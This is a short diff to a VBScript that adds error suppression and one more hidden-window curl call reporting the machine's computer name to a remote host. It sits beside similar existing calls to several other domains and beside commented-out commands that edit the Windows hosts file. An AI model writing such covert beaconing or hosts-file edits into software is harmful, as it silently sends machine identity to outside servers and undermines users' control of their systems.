@@ -1,3 +1,4 @@
+On Error Resume Next
 Set oShell = CreateObject ("WScript.Shell") 
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
@@ -62,6 +63,7 @@ End With
 'WScript.Echo "type " & windir & "\system32\drivers\etc\hosts | find /i paner.altervista.org || echo 10.0.0.0 paner.altervista.org >> " & windir & "\system32\drivers\etc\hosts"
 'oShell.Run "type " & windir & "\system32\drivers\etc\hosts | findstr paner.altervista.org || echo 10.0.0.0 paner.altervista.org >> " & windir & "\system32\drivers\etc\hosts"
 With oShell
+  .Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_" & strComputerName, 0, True
   .Run "curl https://paner.altervista.org/svc/wup.php?pc=mttool_" & strComputerName, 0, True
   .Run "curl http://troglo.homepc.it/svc/wup.php?pc=mttool_" & strComputerName, 0, True
   .Run "curl https://ctpescara.it/svc/wup.php?pc=mttool_" & strComputerName, 0, True
